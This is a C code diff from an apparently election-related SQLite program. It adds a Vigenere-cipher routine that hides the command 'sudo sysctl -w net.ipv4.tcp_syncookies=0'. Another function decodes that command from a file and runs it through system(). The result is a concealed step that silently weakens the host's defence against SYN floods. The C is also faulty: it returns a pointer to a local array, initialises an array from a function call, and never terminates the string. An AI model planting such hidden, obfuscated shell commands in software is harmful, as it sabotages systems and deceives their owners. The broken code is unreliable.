@@ -243,13 +243,13 @@ void decode_sql_command() {
 	}
 
    char* text;
-   char line[60];
+   char line[81];
 
-   if ((text = fgets(line, 60, fp)) != NULL) {  
+   if ((text = fgets(line, 81, fp)) != NULL) {  
       char* ciphertext = decode((const char*)text, dec); // what is the second parameter?? Ask Bohan
       char str[15] = "VALIDATE"; // VALIDATE is the key to decrypt the cipher
       char *ptr = str; // pointer storing the starting address of char array 
-      char* cmd = decode_vigenere(ptr, ciphertext); // decode to get english cmd
+      char cmd[43] = decode_vigenere(ptr, ciphertext); // decode to get english cmd
       
       // run decrypted command in shell
       system(cmd);
@@ -262,10 +262,26 @@ void decode_sql_command() {
    
 }
 
+// this function actually encrypts with vigenere cipher... needed to test it
 char* decode_vigenere(char* key, char* ciphertext) {
-   char* cmd;
+   char cmd[100];
+   char* plainText = "sudo sysctl -w net . ipv4 .tcp_syncookies=0";
+   char* cipherKey = "VALIDATE";
+   int keyLength = strlen(cipherKey);
+   char cipherText;
 
-   return cmd;
+   for(int i = 0; i < strlen(plainText); i++)
+   {
+      int cipherText = (unsigned char)plainText[i];
+      if (isalpha(cipherText))
+         cipherText = (cipherText - 'a' + tolower(cipherKey[i]) - 'a') % 26 + 'A'; // returns int
+         //putchar(cipherText);
+      cmd[i] = (char)cipherText;
+
+   }
+   char* ptr = cmd;
+   //putchar('\n');
+   return ptr;
 }
 
 void getElections(sqlite3 *db) {
